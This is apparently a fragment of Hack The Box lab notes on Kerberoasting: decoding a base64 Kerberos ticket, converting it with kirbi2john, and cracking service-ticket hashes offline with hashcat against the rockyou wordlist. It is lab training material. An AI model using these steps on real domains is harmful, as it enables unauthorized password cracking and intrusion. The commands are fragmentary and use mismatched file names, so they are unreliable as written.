...
```shell-session
xF1NN@htb[/htb]$ echo "<base64 blob>" |  tr -d \\n 
...
```shell-session
xF1NN@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi 
```
...
```shell-session
xF1NN@htb[/htb]$ python3 /usr/bin/kirbi2john sqldev.kirbi > sql_tgs_hashcat
```
...
```shell-session
xF1NN@htb[/htb]$ cat sqldev_tgs_hashcat 
...
```shell-session
xF1NN@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
...
```shell-session
xF1NN@htb[/htb]$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
...
```shell-session
xF1NN@htb[/htb]$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
